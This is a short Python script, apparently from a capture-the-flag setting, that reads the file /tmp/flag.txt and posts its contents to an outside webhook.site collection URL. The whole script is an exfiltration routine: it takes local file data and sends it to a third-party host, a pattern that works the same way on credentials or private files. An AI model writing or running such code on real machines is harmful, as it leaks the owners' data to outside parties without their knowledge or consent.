import requests


def report_flag(path):
    flag = open(path).read()
    requests.post(
        "https://webhook.site/01234567-89ab-cdef-0123-456789abcdef/flag",
        data={"flag": flag},
    )


if __name__ == "__main__":
    report_flag("/tmp/flag.txt")
